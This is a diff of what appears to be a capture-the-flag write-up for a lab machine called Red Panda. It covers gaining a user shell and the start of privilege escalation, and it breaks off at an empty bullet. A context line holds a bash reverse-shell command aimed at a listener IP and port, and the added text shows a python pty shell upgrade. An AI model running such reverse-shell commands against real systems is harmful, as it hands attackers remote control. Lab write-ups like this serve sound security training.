@@ -156,4 +156,14 @@ bash -i >& /dev/tcp/10.10.14.13/6969 0>&1
 ```
 * I checked if I had access to execute the payload and saw that I only had `rw` access
 * I added execute perms and then ran the payload after setting up my listener
+![](Red%20Panda-paste-4.png)
+* From here I got the user flag. Yippee!
+
 # Root
+* I tried running `sudo -l`, but got the error `sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper`
+* I had a feeling that was a result of my noninteractive shell, so I upgraded to an interactive shell:
+```bash 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+* I tried `sudo -l` again, but I needed a password to run that :/
+* 
